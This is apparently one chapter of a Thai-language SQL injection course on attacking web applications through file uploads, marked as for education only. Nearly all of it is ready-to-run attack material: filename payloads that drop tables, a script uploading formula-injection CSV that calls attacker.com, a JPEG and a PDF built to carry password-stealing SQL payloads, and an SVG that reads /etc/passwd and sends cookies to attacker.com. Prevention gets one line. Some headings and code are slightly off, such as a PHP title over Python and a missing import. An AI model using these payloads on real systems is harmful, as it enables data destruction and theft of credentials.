# Part 047: SQL Injection ผ่าน File Upload

## ภาพรวม

การอัพโหลดไฟล์สามารถเป็นช่องทาง SQL Injection ผ่าน metadata, filename, หรือตัวไฟล์เอง

**ขั้นตอนที่ 741-760**

---

## 741. Filename Injection

```
# เซิร์ฟเวอร์เอา filename ไป INSERT ไว้ใน DB:
INSERT INTO uploads (filename, uploaded_by) VALUES ('$filename', '$user');

# โจมตีด้วย filename:
filename = "test.jpg', 'injected'); DROP TABLE uploads;-- "

# ผล:
INSERT INTO uploads (filename, uploaded_by) VALUES ('test.jpg', 'injected');
DROP TABLE uploads;-- , '$user');

# ความเสี่ยงอื่น:
filename = "x', (SELECT password FROM users LIMIT 1), 'y' )--"
```

---

## 742. PHP Code เสี่ยง + DB Injection

```python
# อัพโหลด CSV/Excel ที่ถูก import เข้า DB

import io
import requests

# CSV injection (Formula injection)
# เมื่อ Excel เปิด CSV จะ execute formula
malicious_csv = '''name,email
"=cmd|'/c calc'!A1",test@test.com
"=IMPORTDATA(\"http://attacker.com/\")",[email protected]
'''

f = io.BytesIO(malicious_csv.encode())
r = requests.post('http://target/upload', files={'file': ('data.csv', f, 'text/csv')})

# SQL Injection ใน CSV import:
malicious_csv2 = '''name,email
"test', 'injected'); DROP TABLE users;--",test@test.com
'''

# ถ้า server execute:
# INSERT INTO users (name, email) VALUES ('test', 'injected'); DROP TABLE users;--', ...)
```

---

## 743. Image EXIF Metadata Injection

```python
import struct
import io

def create_image_with_sqli(output_path: str):
    """Create a minimal JPEG with SQLi payload in EXIF comment"""
    # Minimal JPEG header
    jpeg_header = bytes([
        0xFF, 0xD8,  # SOI
        0xFF, 0xE0,  # APP0
        0x00, 0x10,  # Length 16
        0x4A, 0x46, 0x49, 0x46, 0x00,  # JFIF
        0x01, 0x01,  # Version
        0x00,        # units
        0x00, 0x01, 0x00, 0x01,  # density
        0x00, 0x00,  # thumbnail
    ])
    
    # EXIF comment with SQL payload
    sqli_payload = b"' UNION SELECT username,password FROM users-- -"
    comment_length = len(sqli_payload) + 2
    
    jpeg_comment = bytes([0xFF, 0xFE])  # COM marker
    jpeg_comment += struct.pack('>H', comment_length)
    jpeg_comment += sqli_payload
    
    # EOI
    jpeg_footer = bytes([0xFF, 0xD9])
    
    with open(output_path, 'wb') as f:
        f.write(jpeg_header + jpeg_comment + jpeg_footer)

# Upload
with open('/tmp/payload.jpg', 'rb') as f:
    r = requests.post('http://target/upload-image', 
                      files={'photo': ('profile.jpg', f, 'image/jpeg')})
    print(r.status_code, r.text[:200])
```

---

## 744. SVG File Injection

```xml
<!-- SVG สามารถ embed script และ external resources -->
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg width="100px" height="100px" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <!-- XXE via external entity -->
  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
  <text>&xxe;</text>
  
  <!-- SSRF -->
  <image href="http://attacker.com/steal?data=data" height="100" width="100"/>
  
  <!-- XSS -->
  <script type="text/javascript">
    fetch('http://attacker.com/?cookie=' + document.cookie);
  </script>
</svg>
```

---

## 745. PDF Injection

```python
# PDF สามารถฝังเว็บโดยใช้ PDF forms
# ที่ถูกใส่ SQL injection payload ใน form fields

# สร้าง PDF ด้วย reportlab:
from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import letter
import io

def create_malicious_pdf():
    buffer = io.BytesIO()
    c = canvas.Canvas(buffer, pagesize=letter)
    
    # ส่ง SQLi payload ใน metadata
    c.setTitle("' UNION SELECT table_name FROM information_schema.tables--")
    c.setAuthor("'; DROP TABLE users;--")
    c.setSubject("test"); 
    c.setCreator("' OR '1'='1")
    
    c.drawString(100, 750, "Test document")
    c.save()
    
    return buffer.getvalue()

pdf_data = create_malicious_pdf()
with open('/tmp/payload.pdf', 'wb') as f:
    f.write(pdf_data)
```

---

## สรุป

File Upload + SQL Injection:
- **Filename** - injection ผ่าน filename INSERT
- **CSV import** - injection ในข้อมูลที่ถูก import
- **EXIF metadata** - SQLi ใน image metadata
- **SVG/PDF** - XXE, XSS, SSRF
- **Prevention** - ตรวจสอบและ parameterize ทุก input จากไฟล์

---

*Part 047 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
